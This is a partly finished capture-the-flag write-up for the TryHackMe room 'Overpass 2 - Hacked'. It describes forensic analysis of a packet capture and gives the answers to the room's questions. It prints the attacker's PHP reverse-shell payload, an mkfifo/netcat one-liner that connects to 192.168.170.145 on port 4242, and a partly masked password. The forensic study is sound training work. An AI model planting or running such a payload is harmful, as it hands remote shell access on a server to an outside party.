# Overpass 2 - Hacked

- [Tools](#tools)
- [Forensics - Analyse the PCAP](#forensics---analyse-the-pcap)
- [Research - Analyse the code](#research---analyse-the-code)
- [Attack - Get back in!](#attack---get-back-in)

Room Link: https://tryhackme.com/room/overpass2hacked

## Tools 

1. 

##  Forensics - Analyse the PCAP

1. Download `overpass2.pcapng`.
2. Check and match `md5sum` of the file to verify file.
```bash
md5sum overpass2.pcapng 
11c3b2e9221865580295bc662c35c6dc  overpass2.pcapng
```
3. We can use `wireshark` and `follow TCP streams` of suspicious streams. But, I used `strings overpass2.pcapng`.
4. With strings we can see everything in plaintext. There is a request to link on directory `/development/upload.php`.
5. Question `What was the URL of the page they used to upload a reverse shell?` Answer `/development/`.
6. With same method we can get the payload `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>`. You can check it by scrolling or simply use `strings overpass2.pcapng |grep "php exec"`
7. Question `What payload did the attacker use to gain access?` Answer `exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")`.
8. Question `What password did the attacker use to privesc?` Password `whene************tant`. You can manually scan strings result to see the password.
9. 


## Research - Analyse the code

## Attack - Get back in!


Author: Zishan Ahamed Thandar
